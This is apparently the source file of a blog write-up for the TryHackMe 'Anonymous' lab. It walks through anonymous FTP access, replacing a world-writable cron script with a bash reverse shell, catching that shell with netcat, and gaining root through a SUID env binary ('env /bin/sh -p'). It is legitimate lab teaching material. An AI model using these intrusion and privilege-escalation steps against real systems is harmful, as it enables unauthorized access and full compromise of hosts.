// Anonymous (TryHackMe). Both flags are blurred in the screenshots and hidden in text. IPs are left as they were.
import { term, fig, why, step, hidden } from "../helpers.mjs";

const K = { cwd: "~/Desktop/THM/Anonymous_writeups" };                                  // my machine
const KR = { root: true, cwd: "/home/zero/Desktop/THM/Anonymous_writeups" };             // my machine as root
const F = { who: "shell", prompt: "ftp&gt;", title: "ftp — 10.49.180.33" };              // inside the ftp client
const MSF = { who: "shell", prompt: "msf &gt;", title: "msfconsole" };
const N = { who: "shell", user: "namelessone", host: "anonymous", cwd: "~" };           // reverse shell as namelessone

export default {
  slug: "anonymous",
  title: "Anonymous",
  platform: "TryHackMe",
  diff: "medium",
  os: "Linux",
  date: "2026-11-13",
  room: "https://tryhackme.com/room/anonymous",
  tools: ["nmap", "metasploit", "smbclient", "ftp", "netcat", "GTFOBins"],
  tags: ["ftp", "anonymous-login", "smb", "cron", "writable-script", "reverse-shell", "suid", "env"],
  path: ["nmap (FTP, SSH, SMB)", "anonymous FTP", "world-writable clean.sh run by cron", "bash reverse shell as namelessone", "SUID /usr/bin/env", "root"],
  summary: "Anonymous is a TryHackMe machine with an FTP server open to anyone. Inside it I found a cleanup script that ran on a timer and that anyone could edit, so I replaced it with a reverse shell and got in as namelessone. For root, I found env with the SUID bit set and used it to start a root shell.",
  description: "TryHackMe Anonymous walkthrough: anonymous FTP, a world-writable cron script turned into a bash reverse shell, SMB share enumeration, and SUID env to root.",
  banner: "/images/anonymous/room.webp",
  sections: [
    { id: "q1", h: "Q1–Q3. Open ports, and the services on 21 and 139/445", body:
      step(1, "Scan all ports",
        term({ ...KR, cmds: ["nmap -sVC -p- 10.49.180.33"] }) +
        fig("/images/anonymous/nmap-full.webp", "Four open ports: 21 ftp, 22 ssh, 139 and 445 Samba.") +
        "<p><code>-p-</code> scans all 65535 ports, not just the common 1000. The scripts already show that anonymous FTP login is allowed and that the <code>scripts</code> folder is writable. That is a strong early hint.</p>" +
        fig("/images/anonymous/nmap-smb-scripts.webp", "SMB script results: the host is called anonymous, guest access.") +
        "<p>This one scan answers the first three questions: <strong>4</strong> open ports, port 21 runs <strong>ftp</strong> (vsftpd), and 139/445 run Samba. nmap labels them <code>netbios-ssn</code>, but the room wants the protocol name: <strong>smb</strong>.</p>")
    },

    { id: "q4", h: "Q4. There's a share on the user's computer. What's it called?", body:
      step(1, "Find the SMB share scanner in Metasploit",
        term({ ...K, cmds: ["msfconsole"] }) +
        term({ ...MSF, cmds: ["search smb_enumshares", "use 0"] }) +
        fig("/images/anonymous/msf-search.webp", "auxiliary/scanner/smb/smb_enumshares, selected with use 0.")) +

      step(2, "Point it at the target and run it",
        term({ ...MSF, prompt: "msf auxiliary(smb_enumshares) &gt;", cmds: ["set rhosts 10.49.180.33", "run"] }) +
        fig("/images/anonymous/msf-rhosts.webp", "rhosts set to the target.") +
        fig("/images/anonymous/msf-shares.webp", "Three shares: print$, pics and IPC$.") +
        "<p><code>print$</code> and <code>IPC$</code> are default Samba shares, so I ignore them. The real one is <strong>pics</strong>, \"My SMB Share Directory for Pics\". This only names the share; it does not give a shell. <code>smbclient -L //10.49.180.33 -N</code> lists the same shares.</p>")
    },

    { id: "q5", h: "Q5. user.txt", body:
      step(1, "Confirm anonymous FTP",
        term({ ...KR, cmds: ["nmap --script=ftp-anon -p21 10.49.180.33"] }) +
        fig("/images/anonymous/nmap-ftp-anon.webp", "Anonymous login allowed; the scripts folder is writable.") +
        "<p>A world-writable folder on FTP is unusual and worth a close look.</p>") +

      step(2, "Log in as Anonymous and download the files",
        term({ ...KR, cwd: "/home/zero/Desktop/THM", cmds: ["ftp 10.49.180.33"], out: "Name: Anonymous\nPassword:            <span class=\"hl\">(just press Enter)</span>" }) +
        fig("/images/anonymous/ftp-login.webp", "Logged in as Anonymous.") +
        term({ ...F, cmds: ["cd scripts", "ls -la", "get clean.sh", "get removed_files.log", "get to_do.txt"] }) +
        fig("/images/anonymous/ftp-scripts.webp", "The scripts folder: clean.sh, removed_files.log, to_do.txt.") +
        fig("/images/anonymous/ftp-get.webp", "All three files downloaded.")) +

      step(3, "Read to_do.txt",
        term({ ...KR, cmds: ["cat to_do.txt"] }) +
        fig("/images/anonymous/to-do.webp", "The owner knows anonymous login is not safe.") +
        "<p>A hint that I am in the right place.</p>") +

      step(4, "Read clean.sh and its permissions",
        term({ ...KR, cmds: ["cat clean.sh"] }) +
        fig("/images/anonymous/clean-sh.webp", "The cleanup script.") +
        "<p>On the server, <code>clean.sh</code> has permissions <code>-rwxr-xrwx</code>. The last <code>rwx</code> means anyone can write to it, not only the owner. So I can change what it does.</p>") +

      step(5, "Notice the log keeps growing",
        term({ ...KR, cmds: ["cat removed_files.log"] }) +
        fig("/images/anonymous/removed-log.webp", "The same line again and again: clean.sh runs on a timer.") +
        "<p><code>removed_files.log</code> keeps growing and its timestamp keeps updating, so something runs <code>clean.sh</code> again and again: a cron job I cannot see.</p>" +
        why("A cron job is a task Linux runs on a timer with no person involved. <code>clean.sh</code> is run automatically as another user, and anyone can write to it. Whatever I put in the file runs as that user. That is the whole bug.")) +

      step(6, "Check the pics share (dead end)",
        term({ ...K, cwd: "~/Desktop/THM", cmds: ["smbclient //10.49.180.33/pics -N"] }) +
        term({ who: "shell", prompt: "smb: \\&gt;", title: "smbclient — //10.49.180.33/pics", cmds: ["ls", "get corgo2.jpg", "get puppos.jpeg"] }) +
        fig("/images/anonymous/smb-pics.webp", "Two dog pictures, nothing else.") +
        "<p>They are just pictures of dogs. The real path is the FTP script, so I go back to <code>clean.sh</code>.</p>") +

      step(7, "Put a reverse shell in clean.sh",
        "<p>I take a Bash reverse shell from revshells.com. The IP must be my tun0 VPN IP (<code>192.168.137.189</code>), not my LAN IP, or the target cannot reach me.</p>" +
        fig("/images/anonymous/revshells.webp", "revshells.com: Bash -i, my tun0 IP, port 4444.") +
        "<p>I keep the first line <code>#!/bin/bash</code> and the original structure, and put the payload in the <code>then</code> branch:</p>" +
        fig("/images/anonymous/clean-sh-edited.webp", "clean.sh after my edit, with the reverse shell in the then branch.") +
        why("The script checks <code>if [ $tmp_files=0 ]</code> with no spaces around <code>=</code>. bash does not compare two values; it sees one word, <code>0=0</code>, and <code>[ word ]</code> only asks \"is this word non-empty?\". It always is, so the <code>then</code> branch always runs. That is why the payload goes there. The <code>#!/bin/bash</code> line matters too: the <code>/dev/tcp</code> trick is bash-only and fails under plain <code>sh</code>.")) +

      step(8, "Upload it from the right folder",
        "<p>My first upload sent the wrong file, because ftp was started in another local folder. So now I start ftp from the folder with my edited <code>clean.sh</code> and check it before <code>put</code>:</p>" +
        term({ ...K, cmds: ["ftp 10.49.180.33"] }) +
        term({ ...F, cmds: ["!pwd", "cd scripts", "!ls -l", "ls", "put clean.sh"] }) +
        fig("/images/anonymous/ftp-put-check.webp", "!pwd and !ls -l confirm the local file; the server size changes after put.") +
        fig("/images/anonymous/ftp-put.webp", "put clean.sh: transfer complete.") +
        "<p>I compare the file size on the server with my local file, so I know the right file landed before I wait for the timer.</p>") +

      step(9, "Catch the shell and read user.txt",
        term({ ...K, cmds: ["nc -l -p 4444"] }) +
        fig("/images/anonymous/listener.webp", "Listener on port 4444.") +
        term({ ...N, cmds: ["ls", "cat user.txt"] }) +
        fig("/images/anonymous/user-flag.webp", "Shell as namelessone; user.txt (flag blurred).") +
        "<p>When the timer runs <code>clean.sh</code>, a shell drops in as <code>namelessone</code>. The \"no job control\" message is normal for a raw reverse shell.</p>" +
        why("A reverse shell makes the target connect out to me. A bind shell would open a new port on the target and wait, which a firewall often blocks. On a VPN lab like this, reverse is the safe choice."))
    },

    { id: "q6", h: "Q6. root.txt", body:
      step(1, "Check who I am first",
        term({ ...N, cmds: ["sudo -l"] }) +
        fig("/images/anonymous/sudo-l.webp", "sudo -l: no tty present.") +
        "<p>This fails only because the reverse shell is not a real terminal. It does not mean I have no rights. (<code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'</code> would fix it.)</p>" +
        term({ ...N, cmds: ["id"] }) +
        fig("/images/anonymous/id.webp", "namelessone is in the sudo and lxd groups.") +
        "<p>I am in the <code>sudo</code> group, but I do not know namelessone's password. I am also in <code>lxd</code>, another known route to root, but the SUID path below is simpler.</p>" +
        term({ ...N, cmds: ["cat /etc/shadow"] }) +
        fig("/images/anonymous/shadow.webp", "Permission denied, as expected for a normal user.")) +

      step(2, "Find SUID binaries",
        term({ ...N, cmds: ["find / -perm -4000 2>/dev/null"] }) +
        fig("/images/anonymous/suid-find.webp", "The /snap/core/... lines are normal.") +
        fig("/images/anonymous/suid-env.webp", "/usr/bin/env has the SUID bit. That is not normal.") +
        "<p>A SUID file runs with its owner's rights, so a SUID file owned by root runs as root. <code>/usr/bin/env</code> is not normally SUID. That is my way up.</p>") +

      step(3, "Look up env on GTFOBins",
        fig("/images/anonymous/gtfobins-env.webp", "GTFOBins, env, SUID tab: env /bin/sh -p.") +
        why("The <code>-p</code> flag is the key. Without it, the shell drops the root rights it got from SUID and I stay namelessone.")) +

      step(4, "Become root",
        term({ ...N, cwd: "/", cmds: ["env /bin/sh -p", "whoami"] }) +
        fig("/images/anonymous/env-root.webp", "whoami: root.")) +

      step(5, "Read root.txt",
        term({ who: "shell", prompt: "#", title: "root shell — anonymous", cmds: ["cd /root", "ls", "cat root.txt"] }) +
        fig("/images/anonymous/root-flag.webp", "root.txt (flag blurred)."))
    }
  ]
};
